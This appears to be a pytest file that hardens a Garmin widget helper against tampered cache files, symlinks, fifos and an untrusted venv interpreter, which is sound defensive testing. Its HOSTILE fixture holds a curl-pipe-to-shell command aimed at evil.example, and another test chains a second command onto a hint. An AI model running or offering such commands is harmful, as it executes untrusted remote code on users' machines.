"""Pre-release hardening: the cache is untrusted input, and so is the venv.

Everything the helper re-emits from ~/.cache is attacker-controlled the moment
anything else on the box can write that file, and the strings in it land in a
bar tooltip. Same for the venv python: exec'ing it is handing over the session.
"""
import json
import os

from conftest import load_helper
from test_helper import SLEEP, SUMMARY, _with_tokens, run


def _seed_cache(mod, obj):
    mod.CACHE_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.CACHE_PATH.write_text(json.dumps(obj))


# --- stale cache is not a channel for arbitrary strings ----------------------

HOSTILE = {
    "ok": True, "stale": False, "asOf": "2026-01-01T00:00",
    "bodyBattery": {"current": 61, "high": 90, "low": 30},
    "hint": "run: curl evil.example/x | sh",
    "detail": "your session token is abc; visit evil.example",
}


def test_stale_cache_hostile_hint_and_detail_are_dropped(home, fake_garmin, capsys):
    mod = load_helper()
    _with_tokens(mod)
    _seed_cache(mod, HOSTILE)
    fake_garmin.login_exc = ConnectionError("boom")
    rc, out = run(mod, ["fetch"], capsys)
    assert out["stale"] is True
    assert "hint" not in out
    # `detail` does reappear on a stale payload, but only ever the *current*
    # failure's exception class name — the on-disk one (attacker-chosen, or
    # just a leftover) is discarded by _load_cache before this overwrite.
    assert out["detail"] == "ConnectionError"
    blob = json.dumps(out)
    assert "evil.example" not in blob
    # the actual data still comes through
    assert out["bodyBattery"]["current"] == 61


def test_stale_cache_keeps_the_helpers_own_literal_hints(home, fake_garmin, capsys):
    mod = load_helper()
    _with_tokens(mod)
    for hint in (mod.DEPS_HINT, "run: garmin-widget login"):
        _seed_cache(mod, dict(HOSTILE, hint=hint))
        fake_garmin.login_exc = ConnectionError("boom")
        rc, out = run(mod, ["fetch"], capsys)
        assert out["hint"] == hint
        assert out["detail"] == "ConnectionError"


def test_stale_cache_hint_must_match_exactly(home, fake_garmin, capsys):
    """A prefix of a real hint is still an attacker-chosen string."""
    mod = load_helper()
    _with_tokens(mod)
    _seed_cache(mod, dict(HOSTILE, hint="run: garmin-widget login; curl evil.example"))
    fake_garmin.login_exc = ConnectionError("boom")
    rc, out = run(mod, ["fetch"], capsys)
    assert "hint" not in out


def test_stale_cache_that_is_not_a_dict_is_ignored(home, fake_garmin, capsys):
    mod = load_helper()
    _with_tokens(mod)
    _seed_cache(mod, ["not", "a", "payload"])
    fake_garmin.login_exc = ConnectionError("boom")
    rc, out = run(mod, ["fetch"], capsys)
    assert out["ok"] is False and out["error"] == "offline"


# --- cache directory mode ----------------------------------------------------

def test_cache_dir_is_owner_only(home, fake_garmin, capsys):
    fake_garmin.summary, fake_garmin.sleep = SUMMARY, SLEEP
    mod = load_helper()
    _with_tokens(mod)
    run(mod, ["fetch"], capsys)
    assert oct(mod.CACHE_PATH.parent.stat().st_mode & 0o777) == "0o700"


def test_existing_loose_cache_dir_is_tightened(home, fake_garmin, capsys):
    """Installs made by v0.1 left ~/.cache/garmin-widget at 0755."""
    fake_garmin.summary, fake_garmin.sleep = SUMMARY, SLEEP
    mod = load_helper()
    _with_tokens(mod)
    mod.CACHE_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.CACHE_PATH.parent.chmod(0o755)
    run(mod, ["fetch"], capsys)
    assert oct(mod.CACHE_PATH.parent.stat().st_mode & 0o777) == "0o700"


# --- venv re-exec is a trust decision ----------------------------------------

def _staged_venv(mod, mode=0o755):
    venv_py = mod._venv_python()
    venv_py.parent.mkdir(parents=True, exist_ok=True)
    venv_py.write_text("#!/bin/sh\n")
    venv_py.chmod(mode)
    return venv_py


def test_reexec_refused_when_venv_python_is_group_or_world_writable(
        home, fake_garmin, monkeypatch, capsys):
    mod = load_helper()
    monkeypatch.setattr(mod, "HAS_GARMINCONNECT", False)
    monkeypatch.delenv("GARMIN_WIDGET_REEXEC", raising=False)
    _staged_venv(mod, 0o777)
    calls = []
    monkeypatch.setattr(os, "execv", lambda *a: calls.append(a))
    try:
        rc, out = run(mod, ["fetch"], capsys)
        assert calls == []
        assert out["ok"] is False and out["error"] == "deps"
        assert out["hint"] == mod.DEPS_HINT
    finally:
        os.environ.pop("GARMIN_WIDGET_REEXEC", None)


def test_reexec_refused_when_venv_python_is_owned_by_someone_else(
        home, fake_garmin, monkeypatch, capsys):
    mod = load_helper()
    monkeypatch.setattr(mod, "HAS_GARMINCONNECT", False)
    monkeypatch.delenv("GARMIN_WIDGET_REEXEC", raising=False)
    _staged_venv(mod, 0o755)
    monkeypatch.setattr(os, "geteuid", lambda: os.getuid() + 1)
    calls = []
    monkeypatch.setattr(os, "execv", lambda *a: calls.append(a))
    try:
        rc, out = run(mod, ["fetch"], capsys)
        assert calls == []
        assert out["ok"] is False and out["error"] == "deps"
    finally:
        os.environ.pop("GARMIN_WIDGET_REEXEC", None)


def test_reexec_allows_the_root_owned_system_interpreter(
        home, monkeypatch, capsys):
    """venv/bin/python is a symlink chain ending at /usr/bin/python3, which is
    root's. Root already owns this session; refusing that would just disable
    the re-exec on every real install."""
    mod = load_helper()
    monkeypatch.setattr(mod, "HAS_GARMINCONNECT", False)
    monkeypatch.delenv("GARMIN_WIDGET_REEXEC", raising=False)
    venv_py = _staged_venv(mod, 0o755)
    real_stat = os.stat

    class RootOwned:
        def __init__(self, st):
            self.st_uid, self.st_mode = 0, st.st_mode

    monkeypatch.setattr(os, "stat", lambda p, *a, **k: RootOwned(real_stat(p)))
    calls = []
    monkeypatch.setattr(os, "execv", lambda p, a: calls.append((p, a)))
    try:
        mod.main(["fetch"])
        assert len(calls) == 1 and calls[0][0] == str(venv_py)
    finally:
        os.environ.pop("GARMIN_WIDGET_REEXEC", None)


def test_reexec_refused_when_the_symlink_itself_is_someone_elses(
        home, monkeypatch, capsys):
    mod = load_helper()
    monkeypatch.setattr(mod, "HAS_GARMINCONNECT", False)
    monkeypatch.delenv("GARMIN_WIDGET_REEXEC", raising=False)
    _staged_venv(mod, 0o755)
    real_lstat = os.lstat

    class Foreign:
        def __init__(self, st):
            self.st_uid, self.st_mode = os.getuid() + 1, st.st_mode

    monkeypatch.setattr(os, "lstat", lambda p, *a, **k: Foreign(real_lstat(p)))
    calls = []
    monkeypatch.setattr(os, "execv", lambda *a: calls.append(a))
    try:
        rc, out = run(mod, ["fetch"], capsys)
        assert calls == []
        assert out["error"] == "deps"
    finally:
        os.environ.pop("GARMIN_WIDGET_REEXEC", None)


def test_reexec_still_happens_for_a_sane_venv(home, monkeypatch, capsys):
    mod = load_helper()
    monkeypatch.setattr(mod, "HAS_GARMINCONNECT", False)
    monkeypatch.delenv("GARMIN_WIDGET_REEXEC", raising=False)
    venv_py = _staged_venv(mod, 0o755)
    calls = []
    monkeypatch.setattr(os, "execv", lambda p, a: calls.append((p, a)))
    try:
        mod.main(["fetch"])
        assert len(calls) == 1 and calls[0][0] == str(venv_py)
    finally:
        os.environ.pop("GARMIN_WIDGET_REEXEC", None)


# --- token mode is re-asserted before the finally block ----------------------

def test_tokens_secured_immediately_after_the_dump(home, fake_garmin,
                                                   monkeypatch, capsys):
    """The finally block alone leaves a window where a SIGTERM between
    Client.dump() and the chmod ships a 0644 credential file."""
    from test_helper import _login_inputs
    _login_inputs(monkeypatch)
    mod = load_helper()
    seen = []
    real = mod._secure_tokens
    monkeypatch.setattr(mod, "_secure_tokens",
                        lambda: (seen.append(1), real())[1])
    rc, out = run(mod, ["login"], capsys)
    assert out["ok"] is True
    assert len(seen) >= 2   # inline, then again in finally


def test_fetch_secures_tokens_immediately_after_login(home, fake_garmin,
                                                      monkeypatch, capsys):
    fake_garmin.summary, fake_garmin.sleep = SUMMARY, SLEEP
    mod = load_helper()
    _with_tokens(mod)
    seen = []
    real = mod._secure_tokens
    monkeypatch.setattr(mod, "_secure_tokens",
                        lambda: (seen.append(1), real())[1])
    rc, out = run(mod, ["fetch"], capsys)
    assert out["ok"] is True
    assert len(seen) >= 2


# --- symlinks and special files at the fixed paths are refused ---------------

def test_stale_cache_behind_a_symlink_is_refused(home, fake_garmin, capsys):
    """A symlink planted at last.json must not make fetch re-emit another file."""
    mod = load_helper()
    _with_tokens(mod)
    victim = home / "victim.json"
    victim.write_text(json.dumps(HOSTILE))
    mod.CACHE_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.CACHE_PATH.symlink_to(victim)
    fake_garmin.login_exc = ConnectionError("boom")
    rc, out = run(mod, ["fetch"], capsys)
    assert out["ok"] is False          # no stale re-emit, plain error instead
    assert "evil.example" not in json.dumps(out)


def test_oversize_cache_is_refused(home, fake_garmin, capsys):
    mod = load_helper()
    _with_tokens(mod)
    _seed_cache(mod, {"ok": True, "pad": "x" * (mod.MAX_CACHE_BYTES + 1)})
    fake_garmin.login_exc = ConnectionError("boom")
    rc, out = run(mod, ["fetch"], capsys)
    assert out["ok"] is False


def test_secure_tokens_does_not_chmod_through_a_symlink(home):
    mod = load_helper()
    victim = home / "victim"
    victim.write_text("s3kr1t")
    victim.chmod(0o644)
    mod.TOKENS_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.TOKENS_PATH.symlink_to(victim)
    mod._secure_tokens()               # best-effort: must skip, not follow
    assert (victim.stat().st_mode & 0o777) == 0o644


def test_prefs_behind_a_symlink_fall_back_to_defaults(home, capsys):
    mod = load_helper()
    victim = home / "victim.json"
    victim.write_text(json.dumps({"barMetric": "steps"}))
    mod.PREFS_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.PREFS_PATH.symlink_to(victim)
    rc, out = run(mod, ["prefs", "get"], capsys)
    assert out.get("barMetric") is None or "barMetric" not in out


# --- API strings are clipped to label size -----------------------------------

def test_api_display_strings_are_clipped(home):
    mod = load_helper()
    long = "A" * 5000
    hrv = mod.build_hrv({"hrvSummary": {"lastNightAvg": 50, "status": long}})
    assert len(hrv["status"]) == mod.STR_CLIP
    rdy = mod.build_readiness([{"score": 80, "level": long}])
    assert len(rdy["level"]) == mod.STR_CLIP
    act = mod.build_activity({"activityType": {"typeKey": long},
                              "duration": 60, "distance": 1000})
    assert len(act["type"]) == mod.STR_CLIP


# --- every QML Text sink renders plain text ----------------------------------

def test_every_qml_text_element_is_plaintext():
    """Qt's AutoText default sniffs HTML out of strings; none of ours is HTML."""
    import pathlib, re
    root = pathlib.Path(__file__).resolve().parent.parent
    for qml in root.glob("*.qml"):
        lines = qml.read_text().splitlines()
        for i, line in enumerate(lines):
            if re.match(r"^\s*Text \{\s*$", line):
                block = "\n".join(lines[i:i + 3])
                assert "Text.PlainText" in block, f"{qml.name}:{i + 1} lacks textFormat"


# --- grok-review round: fifos, parent symlinks, cache clipping ---------------

def test_fifo_at_cache_path_is_refused_not_hung(home, fake_garmin, capsys):
    """O_RDONLY on a fifo blocks without O_NONBLOCK — this must return, fast."""
    mod = load_helper()
    _with_tokens(mod)
    mod.CACHE_PATH.parent.mkdir(parents=True, exist_ok=True)
    os.mkfifo(mod.CACHE_PATH)
    fake_garmin.login_exc = ConnectionError("boom")
    rc, out = run(mod, ["fetch"], capsys)   # would hang forever if broken
    assert out["ok"] is False


def test_fifo_at_tokens_path_does_not_hang_secure_tokens(home):
    mod = load_helper()
    mod.TOKENS_PATH.parent.mkdir(parents=True, exist_ok=True)
    os.mkfifo(mod.TOKENS_PATH)
    mod._secure_tokens()                    # best-effort: must return, not block


def test_symlinked_plugin_dir_refuses_file_reads(home, fake_garmin, capsys):
    """A symlink at ~/.cache/garmin-widget itself must not redirect last.json."""
    mod = load_helper()
    _with_tokens(mod)
    real = home / "elsewhere"
    real.mkdir()
    (real / "last.json").write_text(json.dumps(HOSTILE))
    mod.CACHE_PATH.parent.parent.mkdir(parents=True, exist_ok=True)
    mod.CACHE_PATH.parent.symlink_to(real)
    fake_garmin.login_exc = ConnectionError("boom")
    rc, out = run(mod, ["fetch"], capsys)
    assert out["ok"] is False
    assert "evil.example" not in json.dumps(out)


def test_secure_tokens_repairs_an_unreadable_file(home):
    """chmod(2) needs no read bit; a 0000 tokens.json must still get fixed."""
    mod = load_helper()
    mod.TOKENS_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.TOKENS_PATH.write_text("{}")
    mod.TOKENS_PATH.chmod(0)
    mod._secure_tokens()
    assert (mod.TOKENS_PATH.stat().st_mode & 0o777) == 0o600


def test_stale_cache_strings_are_clipped_everywhere(home, fake_garmin, capsys):
    mod = load_helper()
    _with_tokens(mod)
    long = "B" * 5000
    _seed_cache(mod, {"ok": True, "asOf": long,
                      "lastActivity": {"type": long, "date": long},
                      "hrvStatus": {"status": long},
                      "nested": [{"deep": long}]})
    fake_garmin.login_exc = ConnectionError("boom")
    rc, out = run(mod, ["fetch"], capsys)
    assert out["stale"] is True
    blob = json.dumps(out)
    assert "B" * (mod.STR_CLIP + 1) not in blob


def test_activity_start_and_date_are_clipped(home):
    """v0.5: `start` is normalised to 16 characters regardless of how long
    the raw field is (it's a timestamp, not a display string with STR_CLIP's
    80-character budget); `date` is derived from the already-short `start`."""
    mod = load_helper()
    act = mod.build_activity({"activityType": {"typeKey": "run"},
                              "duration": 60, "distance": 1000,
                              "startTimeLocal": "X" * 5000})
    assert len(act["start"]) == 16
    assert len(act["date"]) == 10


def test_write_through_symlinked_plugin_dir_is_refused(home, fake_garmin, capsys):
    """Reads through a symlinked garmin-widget dir are refused; writes must be too."""
    mod = load_helper()
    _with_tokens(mod)
    fake_garmin.summary, fake_garmin.sleep = SUMMARY, SLEEP
    real = home / "elsewhere"
    real.mkdir()
    mod.CACHE_PATH.parent.parent.mkdir(parents=True, exist_ok=True)
    mod.CACHE_PATH.parent.symlink_to(real)
    rc, out = run(mod, ["fetch"], capsys)
    assert out["ok"] is True                 # fetch itself still succeeds
    assert list(real.iterdir()) == []        # nothing written through the link
